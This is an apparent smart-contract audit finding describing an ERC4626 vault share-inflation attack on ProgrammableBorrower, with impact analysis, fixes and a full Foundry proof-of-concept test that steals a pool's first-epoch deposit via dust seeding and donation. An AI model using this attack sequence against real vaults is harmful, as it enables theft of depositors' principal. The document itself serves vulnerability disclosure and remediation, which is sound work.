### Title
Unchecked zero-share ERC4626 deposit allows vault inflation and theft of LP principal - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower` deposits all idle pool underlying into a configured ERC4626 vault during `onStartEpoch`, but does not validate that the vault returns shares for the deposited assets. If the configured vault has zero or economically negligible share supply and uses balance-based share conversion, an attacker can inflate its share price before epoch start, cause the pool's deposit to mint zero shares, and redeem the pool's principal through the attacker's vault shares. The configuration path only verifies that the vault asset matches the CDO underlying and does not require existing vault liquidity or a bounded share price. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`ProgrammableBorrower` accepts an arbitrary ERC4626 vault at initialization or through `setVault`; validation is limited to a nonzero address and matching `asset()`. [4](#0-3)  At epoch start, `onStartEpoch` snapshots the borrower's on-hand underlying plus existing vault assets, deposits the full on-hand balance through `_depositToVault`, and marks the pre-deposit total as `epochStartVaultAssets`. [5](#0-4)  `_depositToVault` records no minimum share output and does not check that `shares > 0` or that `convertToAssets(shares)` approximates the deposited amount. [3](#0-2) 

The concrete attack phase is the buffer period before the first programmable-borrower epoch:

1. The configured ERC4626 vault has `totalSupply() == 0`.
2. The attacker deposits a dust amount and receives dust shares.
3. The attacker donates a much larger amount of underlying directly to the vault, making each dust share redeemable for a very large amount.
4. An honest manager calls `startEpoch`; the CDO transfers pool principal to `ProgrammableBorrower`, and `onStartEpoch` deposits it into the inflated vault. [6](#0-5) 
5. The pool deposit mints zero shares or an economically negligible number of shares.
6. The attacker redeems the dust shares for the donation plus the pool deposit.

Afterward, `vault.balanceOf(programmableBorrower)` is zero, so `_currentVaultAssets()` returns zero even though `epochStartVaultAssets` recorded the deposited principal. [7](#0-6)  `availableToBorrow()` therefore reports no usable vault liquidity, while stop-epoch accounting interprets the position as a vault loss rather than recovering the principal. [8](#0-7)  If IdleCDO later requires cash, `onStopEpoch` cannot obtain it from the vault position, and the eventual `transferFrom` fails or defaults the borrower. [9](#0-8) [10](#0-9) 

### Impact Explanation
The attacker can directly steal the pool's first programmable-borrower deposit. For a vulnerable balance-priced vault, a `10`-share seed followed by a donation `D` causes a pool deposit `P` to mint:

```solidity
P * 10 / (D + 10)
```

If `D + 10 > 10 * P`, the result rounds to zero. The attacker spends `D + 10` and redeems `D + 10 + P`, for an approximate profit of `P`; the pool receives no vault position for `P`. With a dust nonzero result rather than zero, substantially the same theft occurs without requiring the division to round fully to zero.

This creates direct theft and subsequent insolvency: the CDO continues carrying strategy-token principal while the programmable borrower no longer owns a corresponding ERC4626 claim. The loss is bounded by the assets deposited into the vault, including the first epoch's pool principal.

### Likelihood Explanation
The attack requires the configured vault to permit donation-based share inflation and to be empty or nearly empty before the borrower deposits pool funds. `ProgrammableBorrower` does not reject empty vaults, seed protected liquidity, bound conversion-price movement, or require a minimum returned-share value. [4](#0-3) [3](#0-2)  An attacker needs temporary capital larger than the expected pool deposit to force a zero-share result, but the donated capital is recovered together with the stolen deposit.

Likelihood is therefore deployment-dependent: a hardened vault with nonzero protected liquidity or a meaningful decimals offset prevents the specific rounding path, while selecting an ordinary balance-accounted vault before it has supply exposes the pool to this sequence. No privileged attacker is required; the attacker only uses the external vault normally.

### Recommendation
Do not treat a successful `vault.deposit` call as proof that assets were safely invested. At minimum:

- Revert when the returned share amount is zero or when `vault.convertToAssets(shares)` is materially below `_assetAmount`.
- Store a vetted vault share-price baseline when configuring the vault and reject deposits when the conversion rate has moved beyond a strict tolerance.
- Prefer vaults that already have protected minimum liquidity or virtual assets/shares.
- Add a configurable `minSharesOut` or maximum acceptable share-price deviation to the vault-deposit path.
- Ensure deployment procedures seed the selected vault or verify that inflation cannot produce a material loss before enabling programmable-borrower mode.

### Proof of Concept
The following Foundry PoC reproduces the complete `ProgrammableBorrower` path on a fork. `InflationVulnerableVault` models an ERC4626 vault whose conversion is based on raw `balanceOf`, as in the reported bug class; a forked production vault with the same behavior can replace it.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract PoCUnderlying is ERC20 {
    constructor() ERC20("Underlying", "UND") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InflationVulnerableVault is ERC20 {
    PoCUnderlying public immutable assetToken;

    constructor(address asset_) ERC20("Vault Share", "vSHARE") {
        assetToken = PoCUnderlying(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        uint256 managed = totalAssets();
        shares = supply == 0 ? assets : assets * supply / managed;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract PoCCDODummy {
    address public immutable token;

    constructor(address token_) {
        token = token_;
    }
}

contract ProgrammableBorrowerShareInflationPoC is Test {
    PoCUnderlying internal underlying;
    InflationVulnerableVault internal vault;
    PoCCDODummy internal cdo;
    ProgrammableBorrower internal programmableBorrower;

    address internal owner = makeAddr("owner");
    address internal manager = makeAddr("manager");
    address internal borrower = makeAddr("borrower");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        underlying = new PoCUnderlying();
        vault = new InflationVulnerableVault(address(underlying));
        cdo = new PoCCDODummy(address(underlying));

        ProgrammableBorrower implementation = new ProgrammableBorrower();
        programmableBorrower = ProgrammableBorrower(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    makeAddr("proxyAdmin"),
                    abi.encodeWithSelector(
                        ProgrammableBorrower.initialize.selector,
                        address(vault),
                        address(cdo),
                        owner,
                        manager,
                        borrower,
                        0
                    )
                )
            )
        );
    }

    function testInflatedVaultStealsFirstEpochDeposit() public {
        uint256 seedAssets = 10;
        uint256 donation = 10_000 ether;
        uint256 poolDeposit = 1_000 ether;

        // Attacker seeds the empty vault, then inflates its assets/share price.
        underlying.mint(attacker, seedAssets + donation);
        vm.startPrank(attacker);
        underlying.approve(address(vault), type(uint256).max);
        vault.deposit(seedAssets, attacker);
        underlying.transfer(address(vault), donation);
        vm.stopPrank();

        assertEq(vault.balanceOf(attacker), seedAssets);

        // IdleCDO sends pool principal to ProgrammableBorrower before onStartEpoch.
        underlying.mint(address(programmableBorrower), poolDeposit);

        vm.prank(address(cdo));
        programmableBorrower.onStartEpoch(0);

        // Inflation causes the pool's deposit to mint zero vault shares.
        assertEq(vault.balanceOf(address(programmableBorrower)), 0);
        assertEq(
            underlying.balanceOf(address(vault)),
            seedAssets + donation + poolDeposit
        );

        // The attacker's ten shares now claim the donation plus the pool deposit.
        uint256 attackerBefore = underlying.balanceOf(attacker);
        vm.prank(attacker);
        uint256 redeemed =
            vault.redeem(seedAssets, attacker, attacker);

        assertEq(redeemed, seedAssets + donation + poolDeposit);
        assertEq(
            underlying.balanceOf(attacker) - attackerBefore,
            seedAssets + donation + poolDeposit
        );

        // ProgrammableBorrower has no recoverable vault position despite the
        // epoch baseline recording the full pool deposit.
        assertEq(programmableBorrower.epochStartVaultAssets(), poolDeposit);
        assertEq(programmableBorrower.vaultSharesBalance(), 0);
    }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-168)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L206-220)
```text
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-354)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }

  /// @notice current borrowable liquidity excluding reserved withdraw requests
  function availableToBorrow() public view returns (uint256) {
    uint256 totalAssets = underlyingToken.balanceOf(address(this)) + _currentVaultAssets();
    // Interest is minted (not pulled as cash), so only pending withdraw requests need reservation.
    uint256 reserved = epochPendingWithdraws;
    return totalAssets <= reserved ? 0 : totalAssets - reserved;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L279-297)
```text
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L408-416)
```text
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
```
